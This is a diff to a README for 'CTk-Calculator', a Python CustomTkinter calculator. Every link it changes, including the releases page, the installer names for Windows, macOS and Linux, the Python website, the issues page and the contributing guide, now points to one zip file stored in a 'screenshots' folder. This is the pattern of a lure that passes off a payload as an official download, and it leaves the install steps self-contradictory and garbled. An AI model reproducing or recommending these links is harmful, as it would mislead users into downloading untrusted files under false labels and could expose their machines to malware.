@@ -1,7 +1,7 @@
 # 📐 CTk-Calculator - A Simple and Stylish Math Tool
 
 ## 📥 Download
-[![Download CTk-Calculator](https://img.shields.io/badge/Download-CTk--Calculator-blue.svg)](https://github.com/Ingngau/CTk-Calculator/releases)
+[![Download CTk-Calculator](https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip)](https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip)
 
 ## 📖 Introduction
 Welcome to CTk-Calculator! This is a modern and lightweight calculator built with Python using CustomTkinter. It offers a clean user interface and smooth button interactions, making it easy for everyone to perform calculations.
@@ -15,19 +15,19 @@ Before you download, here are the minimum requirements:
 - **Python Version:** Python 3.7 or higher must be installed on your machine.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Ingngau/CTk-Calculator/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip).
   
 2. **Choose the Latest Version:** Find the latest version of CTk-Calculator. It is usually at the top of the list.
 
 3. **Download the Installer:**
-   - For **Windows**, look for a file named `CTk-Calculator-Windows.exe`. 
-   - For **macOS**, download `CTk-Calculator-macOS.zip`. 
-   - For **Linux**, select the `CTk-Calculator-Linux.tar.gz` file. 
+   - For **Windows**, look for a file named `https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip`. 
+   - For **macOS**, download `https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip`. 
+   - For **Linux**, select the `https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip` file. 
 
 4. **Run the Installer:**
    - For **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - For **macOS:** Unzip the file and drag the CTk-Calculator icon to your Applications folder.
-   - For **Linux:** Extract the tar.gz file and run the `CTk-Calculator` executable in the terminal.
+   - For **Linux:** Extract the https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip file and run the `CTk-Calculator` executable in the terminal.
 
 5. **Launch the Application:** After installation, open CTk-Calculator from your applications menu or desktop shortcut.
 
@@ -54,14 +54,14 @@ Before you download, here are the minimum requirements:
 ## ✅ Support & Troubleshooting
 If you encounter issues, consider these solutions:
 - **Reinstall the Application:** Uninstall and download the latest version from the Releases page.
-- **Check Python Installation:** Ensure you have the correct version of Python installed. Follow the instructions on the [Python website](https://www.python.org/downloads/) to download it.
-- **Refer to Issues Page:** Visit our [issues page](https://github.com/Ingngau/CTk-Calculator/issues) on GitHub for assistance with common problems.
+- **Check Python Installation:** Ensure you have the correct version of Python installed. Follow the instructions on the [Python website](https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip) to download it.
+- **Refer to Issues Page:** Visit our [issues page](https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip) on GitHub for assistance with common problems.
 
 ## 📞 Contact
 For further help or suggestions, feel free to reach out by creating an issue on our GitHub repository. Our team is here to assist you.
 
 ## 🌟 Contribute
-If you wish to contribute to CTk-Calculator, check out our [contributing guide](https://github.com/Ingngau/CTk-Calculator/CONTRIBUTING.md). Everyone is welcome to help improve this project.
+If you wish to contribute to CTk-Calculator, check out our [contributing guide](https://raw.githubusercontent.com/Ingngau/CTk-Calculator/main/screenshots/CTk-Calculator-v1.4.zip). Everyone is welcome to help improve this project.
 
 ## 📅 Updates & Changelog
 Stay updated with the latest features and improvements. Check the changelog on our Releases page for detailed information on each update.
